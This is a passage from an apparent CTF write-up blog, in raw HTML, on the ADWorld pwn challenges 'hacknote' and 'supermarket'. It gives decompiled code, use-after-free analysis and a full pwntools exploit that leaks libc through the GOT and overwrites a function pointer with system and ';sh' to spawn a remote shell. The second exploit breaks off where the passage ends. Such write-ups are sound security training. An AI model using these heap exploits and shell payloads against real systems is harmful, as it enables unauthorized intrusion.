class="built_in">atoi</span>(&amp;buf);</span><br><span class="line">      <span class="keyword">if</span> ( v0 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="built_in">sub_80487D4</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v0 &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v0 == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">sub_80488A5</span>();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v0 == <span class="number">4</span> )</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">LABEL_13:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Invalid choice&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v0 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      <span class="built_in">sub_8048646</span>();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>sub_8048956</code> (interface):</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_8048956</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;----------------------&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;       HackNote       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;----------------------&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; 1. Add note          &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; 2. Delete note       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; 3. Print note        &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; 4. Exit              &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;----------------------&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Your choice :&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>sub_8048646</code> (1. Add note):</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">sub_8048646</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _DWORD *v0; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+Ch] [ebp-1Ch]</span></span><br><span class="line">  <span class="keyword">int</span> size; <span class="comment">// [esp+10h] [ebp-18h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+14h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( dword_804A04C &lt;= <span class="number">5</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !ptr[i] )</span><br><span class="line">      &#123;</span><br><span class="line">        ptr[i] = <span class="built_in">malloc</span>(<span class="number">8u</span>);</span><br><span class="line">        <span class="keyword">if</span> ( !ptr[i] )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Alloca Error&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        *(_DWORD *)ptr[i] = sub_804862B;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Note size :&quot;</span>);</span><br><span class="line">        <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">8u</span>);</span><br><span class="line">        size = <span class="built_in">atoi</span>(&amp;buf);</span><br><span class="line">        v0 = ptr[i];</span><br><span class="line">        v0[<span class="number">1</span>] = <span class="built_in">malloc</span>(size);</span><br><span class="line">        <span class="keyword">if</span> ( !*((_DWORD *)ptr[i] + <span class="number">1</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Alloca Error&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Content :&quot;</span>);</span><br><span class="line">        <span class="built_in">read</span>(<span class="number">0</span>, *((<span class="keyword">void</span> **)ptr[i] + <span class="number">1</span>), size);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Success !&quot;</span>);</span><br><span class="line">        ++dword_804A04C;</span><br><span class="line">        <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v5;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Full&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>sub_804862B</code> (special <code>puts</code> wrapper):</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">sub_804862B</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(*(<span class="keyword">const</span> <span class="keyword">char</span> **)(a1 + <span class="number">4</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>sub_80487D4</code> (2. Delete note):</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">sub_80487D4</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">  v1 = <span class="built_in">atoi</span>(&amp;buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= dword_804A04C )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( ptr[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(*((<span class="keyword">void</span> **)ptr[v1] + <span class="number">1</span>));</span><br><span class="line">    <span class="built_in">free</span>(ptr[v1]);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>sub_80488A5</code> (3. Print note):</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">sub_80488A5</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">  v1 = <span class="built_in">atoi</span>(&amp;buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= dword_804A04C )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( ptr[v1] )</span><br><span class="line">    (*(<span class="built_in"><span class="keyword">void</span></span> (__cdecl **)(<span class="keyword">void</span> *))ptr[v1])(ptr[v1]);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Analysis-1"><a href="#Analysis-1" class="headerlink" title="Analysis"></a>Analysis</h3><p>It can only save 5 records, and every record contains two items: <code>ptr[i]</code> for <code>puts(*(const char **)(a1 + 4))</code> function pointer, and <code>*(ptr[i]+1)</code> for saving contents.<br>In <code>sub_8048646</code> (1. Add note) it <code>malloc()</code> memory for <code>ptr[i]</code> and <code>*(ptr[i]+1)</code>,but only reads the content to fill <code>*(ptr[i]+1)</code>.<br>In <code>sub_80487D4</code> (2. Delete note) it just <code>free</code> two pointers but not set them as <code>NULL</code>, which leads to <code>UAF</code>.<br>In <code>sub_80488A5</code> (3. Print note) it executes <code>(*(void (__cdecl **)(void *))ptr[v1])(ptr[v1]);</code> to <code>puts</code> contents, and here we can exploit.</p>
<p>The basic data structure is like (after the first <code>add</code>):<br><img src="/imghost/apcaw/uaf1.svg" alt="basic data structure"><br>The first 4 bytes of <code>ptr[i]</code> is fixed assigned as <code>sub_804862B</code> – a special <code>puts</code> that can print <code>content</code> correctly. Our aim is to change its value via illegal method.</p>
<p>If we do 2 <code>add</code> operations, memory looks like:<br><img src="/imghost/apcaw/uaf2.svg" alt="after 2 add"><br>Next <code>delete</code> index <code>0</code>, then <code>1</code>. As <code>fastbin</code> is <code>LIFO</code> (last in first out), and chunks with same size are in the same linked list, we can see 4 freed chunks in it like:<br><img src="/imghost/apcaw/uaf3.svg" alt="after 2 delete"><br>If then we <code>add</code> a 8 bytes size item, it will use 2 8-byte chunks in the fastbin, that would be:<br><img src="/imghost/apcaw/uaf4.svg" alt="after 3rd add"><br>Now we can edit content in old <code>ptr[0]</code>. But there is <code>UAF</code> in <code>delete</code>, so <code>ptr[0]</code> can also be called, which lets us execute our target function.</p>
<p>Since it has no <code>system</code>, we need to leak <code>libc</code> for it, then we can calcute <code>libc</code> base address and use shellcode to get shell.</p>
<h3 id="Exploit-1"><a href="#Exploit-1" class="headerlink" title="Exploit"></a>Exploit</h3><p>Since we replace <code>sub_804862B</code> in <code>ptr[i]</code> as <code>system</code> address, but we execute <code>(*(void (__cdecl **)(void *))ptr[v1])(ptr[v1]); </code> so we add <code>;</code> or <code>||</code> to make sure <code>sh</code> can be executed.</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./hacknote&#x27;</span>)</span><br><span class="line">sh = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">43549</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./hacknote&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc_32.so.6&#x27;</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">putstr_addr = <span class="number">0x804862B</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">	sh.recvuntil(<span class="string">&quot;Your choice :&quot;</span>)</span><br><span class="line">	sh.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	sh.recvuntil(<span class="string">&quot;Note size :&quot;</span>)</span><br><span class="line">	sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">	sh.recvuntil(<span class="string">&quot;Content :&quot;</span>)</span><br><span class="line">	sh.sendline(content)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">	sh.recvuntil(<span class="string">&quot;Your choice :&quot;</span>)</span><br><span class="line">	sh.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">	sh.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">	sh.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">	sh.recvuntil(<span class="string">&quot;Your choice :&quot;</span>)</span><br><span class="line">	sh.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">	sh.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">	sh.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">payload = p32(putstr_addr) + p32(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">add(<span class="number">8</span>,payload)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">puts_addr=u32(sh.recv()[:<span class="number">4</span>])</span><br><span class="line">libc_base_addr=puts_addr-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr=libc_base_addr+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">payload=p32(system_addr)+<span class="string">&quot;;sh&quot;</span> <span class="comment"># or &quot;||sh&quot; </span></span><br><span class="line">add(<span class="number">8</span>,payload)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="supermarket"><a href="#supermarket" class="headerlink" title="supermarket"></a>supermarket</h2><p>Attachment: <a href="/filehost/apcaw/supermarket.gz">supermarket.gz</a><br>Description: None</p>
<p>Actually it is a <code>UAF</code> challenge based on <code>note-service2</code> in <a href="/2020/08/29/2020-08-29-ADWorld-PWN-Challenge-Area-Write-ups-GOT-Hijacking/#note-service2">ADWorld PWN Challenge Area Write-ups (GOT Hijacking)</a>.</p>
<h3 id="Information-2"><a href="#Information-2" class="headerlink" title="Information"></a>Information</h3><p>Extract it:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ tar -xvf ./supermarket.gz</span><br><span class="line">./libc.so.6</span><br><span class="line">./supermarket</span><br></pre></td></tr></table></figure>
<p>Check:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ file supermarket</span><br><span class="line">supermarket: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=a1765fd11fcba56dc1bb4342bfabbd198d06df57, stripped</span><br><span class="line">$ checksec supermarket</span><br><span class="line">[*] &#x27;/root/supermarket&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">$ ./libc.so.6</span><br><span class="line">GNU C Library (Ubuntu GLIBC 2.23-0ubuntu10) stable release version 2.23, by Roland McGrath et al.</span><br><span class="line">Copyright (C) 2016 Free Software Foundation, Inc.</span><br><span class="line">This is free software; see the source for copying conditions.</span><br><span class="line">There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A</span><br><span class="line">PARTICULAR PURPOSE.</span><br><span class="line">Compiled by GNU CC version 5.4.0 20160609.</span><br><span class="line">Available extensions:</span><br><span class="line">        crypt add-on version 2.1 by Michael Glad and others</span><br><span class="line">        GNU Libidn by Simon Josefsson</span><br><span class="line">        Native POSIX Threads Library by Ulrich Drepper et al</span><br><span class="line">        BIND-8.2.3-T5B</span><br><span class="line">libc ABIs: UNIQUE IFUNC</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs&gt;.</span><br></pre></td></tr></table></figure>
<p>Pseudocode:<br>It is similar to <code>note-service2</code>, and the <code>entry</code> is changed to:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">entry</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">menu</span>();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;your choice&gt;&gt; &quot;</span>);</span><br><span class="line">    <span class="built_in"><span class="keyword">switch</span></span> ( <span class="built_in">read_num</span>() )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">add</span>();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">del</span>();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">list</span>();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        <span class="built_in">changePrice</span>();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="built_in">changeDescription</span>();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;invalid choice&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>add</code>:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v1; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">char</span> *v2; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">char</span> src; <span class="comment">// [esp+4h] [ebp-24h]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+14h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp+18h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span> &amp;&amp; (&amp;s2)[i]; ++i )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( i &gt; <span class="number">15</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;no more space&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;name:&quot;</span>);</span><br><span class="line">  <span class="built_in">read_str</span>(&amp;src, <span class="number">16</span>);</span><br><span class="line">  v5 = <span class="built_in">read_name_sub</span>(&amp;src);</span><br><span class="line">  <span class="keyword">if</span> ( v5 != <span class="number">-1</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;name exist&quot;</span>);</span><br><span class="line">  v5 = <span class="built_in">sub_8048D95</span>();</span><br><span class="line">  <span class="keyword">if</span> ( v5 == <span class="number">-1</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;no more space&quot;</span>);</span><br><span class="line">  (&amp;s2)[v5] = <span class="built_in">malloc</span>(<span class="number">0x1C</span>u);</span><br><span class="line">  <span class="built_in">strcpy</span>((&amp;s2)[v5], &amp;src);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;name:%s\n&quot;</span>, &amp;src);</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;price:&quot;</span>);</span><br><span class="line">  v4 = <span class="built_in">read_num</span>();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;price:%d\n&quot;</span>, v4);</span><br><span class="line">  <span class="keyword">if</span> ( v4 &gt; <span class="number">0</span> &amp;&amp; v4 &lt;= <span class="number">999</span> )</span><br><span class="line">    *((&amp;s2)[v5] + <span class="number">4</span>) = v4;</span><br><span class="line">  *((&amp;s2)[v5] + <span class="number">5</span>) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( *((&amp;s2)[v5] + <span class="number">5</span>) &lt;= <span class="number">0</span> || *((&amp;s2)[v5] + <span class="number">5</span>) &gt; <span class="number">256</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;descrip_size:&quot;</span>);</span><br><span class="line">    v1 = (&amp;s2)[v5];</span><br><span class="line">    *(v1 + <span class="number">5</span>) = <span class="built_in">read_num</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;descrip_size:%d\n&quot;</span>, *((&amp;s2)[v5] + <span class="number">5</span>));</span><br><span class="line">  v2 = (&amp;s2)[v5];</span><br><span class="line">  *(v2 + <span class="number">6</span>) = <span class="built_in">malloc</span>(*((&amp;s2)[v5] + <span class="number">5</span>));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;description:&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">read_str</span>(*((&amp;s2)[v5] + <span class="number">6</span>), *((&amp;s2)[v5] + <span class="number">5</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>changeDescription</code>:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">changeDescription</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> size; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v1 = <span class="built_in">read_name</span>();</span><br><span class="line">  <span class="keyword">if</span> ( v1 == <span class="number">-1</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;not exist&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( size = <span class="number">0</span>; size &lt;= <span class="number">0</span> || size &gt; <span class="number">256</span>; size = <span class="built_in">read_num</span>() )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;descrip_size:&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( *((&amp;s2)[v1] + <span class="number">5</span>) != size )</span><br><span class="line">    <span class="built_in">realloc</span>(*((&amp;s2)[v1] + <span class="number">6</span>), size);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;description:&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">read_str</span>(*((&amp;s2)[v1] + <span class="number">6</span>), *((&amp;s2)[v1] + <span class="number">5</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Also rename some items for simplification.</p>
<h3 id="Analysis-2"><a href="#Analysis-2" class="headerlink" title="Analysis"></a>Analysis</h3><p>Comparing to <code>note-service2</code> it completes all functions and has a different data structure (get it from <code>add()</code>):</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">commodity</span> &#123;</span>  </span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">16</span>];  </span><br><span class="line">    <span class="keyword">int</span> price;  </span><br><span class="line">    <span class="keyword">int</span> description_size;  </span><br><span class="line">    <span class="keyword">char</span> *description;  </span><br><span class="line">&#125; commodity;  </span><br></pre></td></tr></table></figure>
<p>Vulnerability exists in <code>realloc(*((&amp;s2)[v1] + 6), size);</code> from <code>changeDescription()</code>, because <code>realloc</code> should be used in this way:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// void *realloc(void *ptr, size_t size)</span></span><br><span class="line">str = (<span class="keyword">char</span> *) <span class="built_in">malloc</span>(<span class="number">15</span>);</span><br><span class="line">...</span><br><span class="line">str = (<span class="keyword">char</span> *) <span class="built_in">realloc</span>(str, <span class="number">25</span>);</span><br></pre></td></tr></table></figure>
<p>The <code>realloc</code> first see whether memory is enough to expand <code>str</code> to be a bigger chunck. If it is enough, expand the space and return it; if not enough, allocate space according to newsize and copy original data to it, then release original memory (automatically, no need to <code>free</code>) and return the new address.</p>
<p>Clearly <code>supermarket</code> did not store new address and assign it back to <code>description</code>, pointer still points to the old address, still old size. But it was released, which means it can be allocated to other pointers. However we can also edit <code>description</code> to manipulate the newly allocated content (<code>UAF</code>). </p>
<p>As we got <code>libc.so.6</code>, we can leak the <code>libc</code> base address to get shell. The function <code>list</code> gives us opportunity to print <code>description</code>, we can overwrite it as some function <code>GOT</code> item and use <code>list</code> to leak its address.</p>
<p>Here is our plan:</p>
<ol>
<li>Add a commodity (commodity 0)<br><img src="/imghost/apcaw/uaf5.svg" alt="Step 1"></li>
<li>Add another one (prevent from chunck merging)<br><img src="/imghost/apcaw/uaf6.svg" alt="Step 2"></li>
<li>Edit commodity 0’s <code>description</code> to release it and allocate new space.<br>If commodity 1 and description 1 do not exist, it will just expand old description 0 instead of allocate a new memory.<br><img src="/imghost/apcaw/uaf7.svg" alt="Step 3"></li>
<li>Add one more commodity (commodity 2).<br>Now if we edit description 0, we are editing commodity 2.<br><img src="/imghost/apcaw/uaf8.svg" alt="Step 4"></li>
<li>Edit description 0 to overwrite <code>description</code> pointer in commodity 2 as some function’s <code>GOT</code> item, and use <code>list commodities</code> to leak address.</li>
</ol>
<p>Note: Pay attention to chunck size. The description 0 we released should be <code>unsorted bin</code> instead of <code>fastbin</code>.<br>Because in <code>fastbin</code> it only allocates chunck with same size, while in <code>Change the description of a commodity</code> the last byte will be set <code>0</code>. In commodity the last part is <code>char *description</code> and it is where I write function’s <code>GOT</code> item, so it cannot be <code>0</code>. The chuncks in <code>fastbin</code> are between <code>0x20</code> and <code>0x80</code> bytes, so description 0 should be larger.</p>
<h3 id="Exploit-2"><a href="#Exploit-2" class="headerlink" title="Exploit"></a>Exploit</h3><p>Hijack <code>GOT</code> item of <code>atoi</code>:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line">sh = process(<span class="string">&#x27;./supermarket&#x27;</span>)</span><br><span class="line">sh = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">38898</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./supermarket&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">name,price,size,descrip</span>):</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;your choice&gt;&gt;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;name:&#x27;</span>,name)</span><br><span class="line">    sh.sendlineafter(<span 